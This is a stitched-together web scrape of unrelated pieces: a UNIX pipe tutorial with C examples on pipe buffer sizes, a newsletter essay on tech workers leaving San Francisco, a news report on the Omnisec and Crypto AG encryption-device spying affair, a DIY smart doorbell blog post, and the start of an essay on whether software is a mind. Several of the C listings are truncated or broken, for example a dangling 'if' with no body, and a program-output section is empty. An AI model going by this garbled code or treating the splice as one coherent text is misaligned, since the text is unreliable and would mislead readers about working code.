<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-in-process.svg" alt="pipe in a process"></p>

<p>This interface as it looks is appropriate only for processes that have the shared ancestor (usually the direct parent)
and is usually combined with <code>fork(2)</code>/<code>vfork(2)</code>/<code>posix_spawn(3)</code> or an equivalent interface
(otherwise the pipe would be a futile feature).
To workaround the limitation of having the shared predecessor,
the fifo special files or UNIX domain sockets can be used.</p>

<p>In the UNIX system, file descriptors are inherited by children by default (with some exceptions in modern APIs)
and thus the created pipe, referenced by the array of two file descriptors, connects the child and the parent.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork.svg" alt="pipe after fork"></p>

<p>In order to make the pipe effective, the user has to decide the direction of the data flow and
close the other ends. If the intention is to send data from process A to process B, then we need
to close the <code>fildes[0]</code> (reading) end in process A and <code>fildes[1]</code> (writing) end in process B.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork2.svg" alt="pipe after fork"></p>

<p>Now, the processes can transmit data over the pipe channel.</p>

<p>This algorithm is coded as follows:</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

			err(EXIT_FAILURE, <span>"close"</span>);
		read(fildes[<span>0</span>], <span>&amp;</span>c, <span>1</span>);
		printf(<span>"Received: %c</span><span>\n</span><span>"</span>, c);
		<span>/* force the buffer to be printed on the output (screen) */</span>
		fflush(stdout);
		_exit(<span>0</span>);
	}
	<span>/* parent */</span>
	<span>if</span> (close(fildes[<span>0</span>]) <span>==</span> <span>-</span><span>1</span>)

	<span>/* wait for the child process termination */</span>
	<span>if</span> (wait(<span>&amp;</span>status) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"wait"</span>);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>NB. For the sake of simplicity, certain code paths such as handling interrupts (<code>EINTR</code>) were omitted.</p>

<p>The execution of this program results with:</p>



<p>The UNIX designers put the following constraints on the pipes (assuming <code>O_NONBLOCK</code> not set):</p>

<ul>
<li>Once the readable end of the pipe is closed, any attempt done to write results with <code>SIGPIPE</code> emitted into the writing process.
A process can either be killed or catch or ignore the signal and then needs to handle the error (<code>-1</code> and errno set to <code>EPIPE</code>) manually.</li>
<li>Once the writable end of the pipe is closed, an attempt to read from the pipe returns <code>0</code> and notifes <code>EOF</code> on the file descriptor.</li>
</ul>

<p>Additionally:</p>

<ul>
<li>The amount of free space inside the pipe (kernel buffering) is limited and implementation specific.</li>
<li>When the child process starts, the default stdio I/O buffering on pipes defaults to the fully buffered mode.
The three basic approaches to workaround this are:

<ul>
<li>using <code>fflush(3)</code> explicitly,</li>
<li>changing the buffering mode (<code>setvbuf(3)</code>) or</li>
<li>using pseudo terminals if the child process is not modifiable.</li>
</ul></li>
</ul>

<h2 id="the-kernel-pipe-buffer-size">The kernel pipe buffer size</h2>

<p>The size of the kernel buffer storing the pipe data is limited and will cause further attempts to <code>write(2)</code> data to block
until the space is regained, by the <code>read(2)</code> operation on the other end.
The minimum acceptable value in a <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/limits.h.html">POSIX system</a>
is set to 512 bytes.</p>

<p>In order to check the maximum number of bytes that can be written atomically to a pipe, a programer can use the compiler constant <code>PIPE_BUF</code> or
the dynamic value <code>_PC_PIPE_BUF</code> passed to <code>pathconf(2)</code> or <code>fpathconf(2)</code>.
<code>pathconf(2)</code> and <code>fpathconf(2)</code> can be applied on:</p>

<ul>
<li>directories that can contain fifo files,</li>
<li>fifo files.</li>
</ul>

<p>Additionally, <code>fpathconf(2)</code> can be applied on the pipe file descriptor.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	printf(<span>"_PC_PIPE_BUF: %ld</span><span>\n</span><span>"</span>, fpathconf(fildes[<span>1</span>],_PC_PIPE_BUF));
	printf(<span>"PIPE_BUF: %d</span><span>\n</span><span>"</span>, PIPE_BUF);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>However, the real number is usually larger. It can be retrieved with <code>ioctl(FIONSPACE)</code> on NetBSD.
This feature is unavailable on other systems: FreeBSD, OpenBSD and Linux, thus FreeBSD implements
<code>FIONSPACE</code> for sockets, but not for pipes.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (ioctl(fildes[<span>1</span>], FIONSPACE, <span>&amp;</span>n) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"ioctl"</span>);
	printf(<span>"FIONSPACE fildes[1]: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>An alternative approach to check the maximum buffer size of the pipe feature is to count the
bytes writable into it manually, one by one, and to detect the hang.
This can be achieved for example with the <code>alarm(3)</code> call, unblocking the hang.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;signal.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>static</span> <span>int</span> n;

<span>static</span> <span>void</span>
<span>sighand</span>(<span>int</span> s)
{

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);
	exit(EXIT_SUCCESS);
}

<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (signal(SIGALRM, sighand) <span>==</span> SIG_ERR)
		err(EXIT_FAILURE, <span>"signal"</span>);

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	alarm(<span>5</span>); <span>/* arm the alarm to 5 seconds */</span>

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* if we ended up here, there was an error */</span>
	err(EXIT_FAILURE, <span>"write"</span>);
}</code></pre></div>

<p>Alternatively, one could set the pipe end in the non-blocking mode.
This can be achieved with
the <code>fcntl(2)</code> call and the <code>F_SETFL</code> + <code>O_NONBLOCK</code> arguments.</p>

<p>The <code>O_NONBLOCK</code> mode on pipes causes the following change:</p>

<ul>
<li>Writing into a full pipe buffer returns with <code>-1</code> and errno <code>EAGAIN</code>, instead of blocking.</li>
</ul>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (fcntl(fildes[<span>1</span>], F_SETFL, O_NONBLOCK) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"fcntl"</span>);

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* filter real errors from the unavailable for now resource */</span>
	<span>if</span> (errno <span>!=</span> EAGAIN)
		err(EXIT_FAILURE, <span>"write"</span>);

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>There are a few other kernel specific approaches to guess the maximum buffer size
that can be stored inside the kernel. One of them is to read <code>PIPE_SIZE</code> from <code>&lt;sys/pipe.h&gt;</code>
on BSD systems, but given that it is 16384 for FreeBSD, NetBSD and OpenBSD, it’s merely an
internal implementation specific header.</p>

<p>In order to make the picture fuller, we need to mention that the FreeBSD and NetBSD kernels
allow tuning of the pipe behavior and investigating
the kernel virtual address spent on the buffers.</p>

<p>FreeBSD provides the following <code>sysctl</code> knobs:</p>

<ul>
<li><code>kern.ipc.piperesizeallowed</code>: Pipe resizing allowed</li>
<li><code>kern.ipc.piperesizefail</code>: Pipe resize failures</li>
<li><code>kern.ipc.pipeallocfail</code>: Pipe allocation failures</li>
<li><code>kern.ipc.pipefragretry</code>: Pipe allocation retries due to fragmentation</li>
<li><code>kern.ipc.pipekva</code>: Pipe KVA usage</li>
<li><code>kern.ipc.maxpipekva</code>: Pipe KVA limit</li>
</ul>

<p>NetBSD:</p>

<ul>
<li><code>kern.pipe.maxbigpipes</code>: Maximum number of “big” pipes</li>
<li><code>kern.pipe.nbigpipes</code>: Number of “big” pipes</li>
<li><code>kern.pipe.kvasize</code>: Amount of kernel memory consumed by pipe buffers</li>
</ul>

<p>OpenBSD does not provide any similar <code>sysctl</code> functionality for pipes.</p>

<p>What are “big” pipes in NetBSD? They are special case pipes that exceed <code>PIPE_SIZE</code> …</p></div></div>

More than 1,000 people showed up. <a href="https://gigaom.com/2015/01/23/over-1000-people-showed-up-to-product-hunts-massive-happy-hour/">Reporters chronicled it</a>. I had a passphrase to say at the door to make sure I could get inside. Groupon Inc. co-founder <strong>Andrew Mason</strong> <a href="https://www.bloomberg.com/news/articles/2015-02-17/why-startups-want-this-28-year-old-to-really-like-them?sref=WS92jZg5">observed back then</a>, “I haven’t seen anything that captures the magic of the times we live in the way Product Hunt does.” That visceral feeling of mania over a buzzy San Francisco startup feels so distant now. </p><p>Hoover and I both left San Francisco last year, long before the pandemic. He moved to Los Angeles. I flew to my girlfriend in Brooklyn. Now, the lockdown has given everyone license to scatter. <em>The Wall Street Journal </em>reported that tech companies outside of Silicon Valley are seeing an <a href="https://www.wsj.com/articles/why-some-tech-workers-leaving-silicon-valley-are-changing-jobs-11606053600?mod=tech_lead_pos1">increase in job applicants</a>. <em><a href="https://www.theinformation.com/articles/tech-ceos-are-saying-goodbye-to-san-francisco">The Information</a></em><a href="https://www.theinformation.com/articles/tech-ceos-are-saying-goodbye-to-san-francisco"> reported</a> that Dropbox CEO <strong>Drew Houston</strong> and Splunk CEO <strong>Douglas Merritt</strong> have bought homes in Austin and plan to live there; Brex’s co-founders are in Los Angeles. <strong>Amy Sun</strong>, a promising venture capitalist who left Sequoia to build her own startup, <a href="https://techcrunch.com/2020/11/23/former-sequoia-partner-amy-sun-has-already-raised-millions-for-her-stealthy-startup/">is starting anew in Austin</a>. My tech friends are in Hawaii and wine country. We’ll see where they end up. The tech set has long threatened to abandon Silicon Valley. But this feels more credible. </p><p>We’re all in our own little worlds, looking at our own reflections in Zoom. What does it matter where we live? (And wouldn’t it be nicer if the taxes were lower?)</p><p>So, recently I turned to Hoover – because he’s always been emblematic of that startup hustle to me, even if he no longer embodies the zeitgeist like he once did. I hoped he might offer me some sense of place in a time when our existence is defined by the inside of our homes.</p><p><strong>“Where is Silicon Valley? It's all on the internet. It's been on the internet,”</strong> Hoover told me. </p><p>He’s right, of course. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F26549129-a065-4c5a-8dab-5a43c0d0b432_4256x2832.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F26549129-a065-4c5a-8dab-5a43c0d0b432_4256x2832.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/26549129-a065-4c5a-8dab-5a43c0d0b432_4256x2832.jpeg&quot;,&quot;height&quot;:969,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2629945,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>Purists once restricted the phrase “Silicon Valley” to the places south of San Francisco, where they actually design silicon chips. The usage slipped to include San Francisco as the city became the nexus of all that was young and cool in the technology industry. Now, Silicon Valley is a <a href="https://www.nytimes.com/2020/10/13/books/review/what-tech-calls-thinking-adrian-daub.html">way of thinking</a>, coupled with a certain process for funding and valuing new companies. Somehow Oscar Health, a New York-based health insurance company, and SpaceX, a south of Los Angeles rocketship-manufacturer, both feel like Silicon Valley companies because they raised money from venture capital firms and because they would prefer to receive optimistic, growth-based valuations. Silicon Valley isn’t so much a place anymore. “It's on Twitter. It's on Product Hunt. It's on just different internet communities,” Hoover says. </p><p>Hoover marveled at the ease of investing in startups over video. He recounted a founder’s description of the new way of life: “It’s amazing, so much better. I don't have to bounce from café to office to café.” Hoover shared similar joy for the new order. “I’ve only met founders over video. I think I've only met a few portfolio-company founders in person ever,” he says. “That's just a much more efficient process. It forces investors to not be so constrained by location.”</p><p>It’s a sentiment I’ve heard from a fair number of people. Deals are certainly getting done faster than ever. There’s no excuse to drag out the process when we’re all just sitting around in our pajamas. (Some investors are more reluctant to make investments in strangers over Zoom, so they’re mostly sticking to deals with founders they already know.)</p><p><strong>To be honest, Hoover’s response bummed me out. </strong>I miss trekking from café to office to café, seeing the inside of people’s little worlds. On my last reporting trip to San Francisco before the end times, I bopped around San Francisco, hanging out inside one tech titan’s home and some random venture capital firm offices. I paced around South Park and the Embarcadero. </p><p>So much of Silicon Valley can seem totally made up. We obsess over valuations, but the numerical certainty starts to crumble if you so much as squint at them. What’s the preference stack? Could you really sell the stock at that price to anyone besides the Vision Fund? When will anyone be allowed to sell? </p><p>People sell fake ad inventory. People buy social media followers. So much of the technology news is an illusion. Elon Musk is the <a href="https://www.nbcnews.com/business/business-news/elon-musk-leapfrogs-over-bill-gates-become-second-richest-man-n1248791">second-richest man</a> in the world right now, allegedly. You really believe he’s richer than Bill Gates? Imagine if Musk started unloading Tesla shares.</p><p>Mapping things to the physical world countered the absurdity of it all. It might be crazy but at least the atoms existed. What was more Silicon Valley six years ago than a Product Hunt happy hour, or than a scooter zipping across Dropbox’s offices?</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F82c03a8c-453d-44a3-babf-fd4560c7dfa1_5328x3552.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F82c03a8c-453d-44a3-babf-fd4560c7dfa1_5328x3552.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/82c03a8c-453d-44a3-babf-fd4560c7dfa1_5328x3552.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:3561887,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><div><p>Even as the exodus is real, it is also already overhyped. “Here's the thing that I find super annoying,” says venture capitalist <strong>Ann Miura-Ko</strong>. </p><p><strong>“Everyone either thinks San Francisco is the center of the universe or it's dead,” Miura-Ko says. “It's just super annoying because anyone who has been here for over one cycle knows it always comes back and it always also falls out of favor.”</strong></p></div><p>In all honesty, San Francisco could lose a few thousand tech workers and still keep its grip on the industry. To the defectors, we welcome you to New York. And Austin could really make a run at being a verifiable tech hub. Go somewhere that feels like a vacation.</p><p>The disorientation is a reminder to pay attention to the people that make up Silicon Valley. If Silicon Valley is “on the internet,” as Hoover says, it’s more important than ever that we don’t lose sight of the people who make it tick. That’s one of my goals with this newsletter. I’m so grateful to the thousands of people who have signed up for <em>Newcomer </em>so far and for the hundreds who have paid for a subscription. If you haven’t already, I’d love if you <a href="https://www.newcomer.co/subscribe">joined them</a>. </p><div><p>“If you go to see Silicon Valley, what you'll see are buildings. But it's the people that make it Silicon Valley, not the buildings,” <a href="http://www.paulgraham.com/siliconvalley.html">Paul Graham wrote</a> in a 2006 essay.</p><p>I’m going to do my best to bring everyone to Silicon Valley — no matter where we are. </p></div><p>Have a Happy Thanksgiving!</p></div></div>]]>

</div><p>Swiss public television, SRF, has found a second company besides Crypto AG&nbsp;was involved in manufacturing manipulated devices allegedly used for spying by foreign intelligence.</p>

<time datetime="2020-11-26T11:34:28+01:00">

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>

The whole project cost about $150 (USD), which is about average for a smart doorbell, but it is much more full-featured than anything else you’ll find on the market. For example, it integrates with the rest of the home security system — using machine learning to identify humans, cars, animals, and more:</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 1024px) 100vw, 1024px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg.webp 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg.webp 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg.webp 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg.webp 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg.webp 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg.webp 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg.webp 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg.webp 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg.webp 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg.webp 442w"><img src="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg" alt="DIY smart doorbell detects a guest visitor with AI computer vision" width="1024" height="1024" title="Detecting a person approaching" srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg 442w" sizes="(max-width: 1024px) 100vw, 1024px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x1024.png" data-srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg 442w"></picture><figcaption>The smart doorbell uses TensorFlow to detect people, cars, animals, and more.</figcaption></figure><p>But I’m getting ahead of myself.</p><h2><span id="Designing_the_Smart_Doorbell"></span>Designing the Smart Doorbell<span></span></h2><p>Doorbells live outside.</p><p>Okay, that’s obvious. But it was my first electronic project that needed to <em>survive the elements</em>. To that end, I decided to use a <strong>junction box</strong> to house the electronics themselves.</p><p>The next requirement was also obvious: a <strong>button</strong>. However, the concern with such a unique design is that visitors need to intuitively understand <em>what the device is</em>. I decided upon a durable metal button that also lights up.

This is arguably the most important security camera in the entire house, and I didn’t have a lot of space in the junction box, so I splurged on a <strong>night-vision IR camera</strong> with a microphone built-in.

It also can detect which user pin code was used to open the door (and when) — great peace of mind when giving cleaners a code to the house.</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 947px) 100vw, 947px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png.webp 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png.webp 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png.webp 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png.webp 768w"><img src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" alt="home assistant motioneye camera" width="947" height="717" title="Home Assistant " srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w" sizes="(max-width: 947px) 100vw, 947px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-947x717.png" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w"></picture><figcaption>Home Assistant connects to MotionEye to show the camera, motion alerts, and other detections.</figcaption></figure><p>But, most importantly, it can be locked/unlocked with a tap in Home Assistant.</p><h2><span id="Source_Code_Recap"></span>Source Code: Recap<span></span></h2><p>I wish I could give you copy-and-paste code for this project, but a lot of it will depend on your exact hardware, speakers, cameras, etc. Instead, I’ll recap each piece involved and link to the articles/code where I explain how to implement them:</p><ul><li><a href="https://www.technicallywizardry.com/node-red-docker-kubernetes/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Node Red uses gpiod</a> to trigger a flow when GPIO #18 (the doorbell button) fires.</li><li>The <a href="https://www.technicallywizardry.com/loudspeaker-network-intercoms-alerts/" data-wpel-link="internal" rel="internal follow noopener noreferrer">loudspeaker alert flow plays a wav file</a>.</li><li>I have <a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" data-wpel-link="internal" rel="internal follow noopener noreferrer">multiple DIY speakers</a> that play the alert around the house.</li><li><a href="https://www.technicallywizardry.com/diy-dashcam-raspberry-pi-zero-w-motion-eye/" data-wpel-link="internal" rel="internal follow noopener noreferrer">MotionEye drives the camera</a>, capturing stills and videos.</li><li>The <a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" data-wpel-link="internal" rel="internal follow noopener noreferrer">CCTV Security Cameras</a> handle person/object detection.</li><li><a href="https://www.technicallywizardry.com/tag/home-assistant/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Home Assistant’s</a> Yale Lock integration allows us to lock/unlock.

<h2>Computer Software as Mind</h2>



<p>When I began programming computers, I believed that the processes of the human mind were equivalent to those of our computer programs: this idea is still popular among those in mathematics and technical fields, and professed directly in the field called “Cognitive Science.” Artificial Intelligence, according to this view, is the creation of minds in silicon.</p>



<p>One of the first computer programs I encountered was <em><a href="https://en.wikipedia.org/wiki/ELIZA">Eliza</a></em>, which, on the computer terminal, emulates a psychologist. At that time I believed that when a computer answers the question “who are you?” with “you are the one we are discussing,” she is actually making a claim, just like a real therapist. I had no reason to think that she was anything else but an artificial intelligence, a mind like ours, running on a microchip.</p>



<p>But as I continued to write code, I came to a realization: when I, as a programmer, take an input string, such as “How are you?” and create an output string, such as Eliza’s “This conversation is very demanding for you, isn’t it?” I am not actually creating a new thinking machine. Rather, I am writing a series of conditional commands, a row of if-else or switch statements, which determine, absolutely, what the interlocutor says. Still, it took me a long time to completely lose the belief that computers are artificial minds. My mathematics and computer science teachers, and my fellow students, fostered this belief: the relatively new field called “Cognitive Sciences” seems to be based on it, so it must be true, right?</p>



<p>And then there is the famous Turing Test: if a human can’t distinguish between interaction with a machine and interaction with a human, then the machine must have a mind, right? </p>



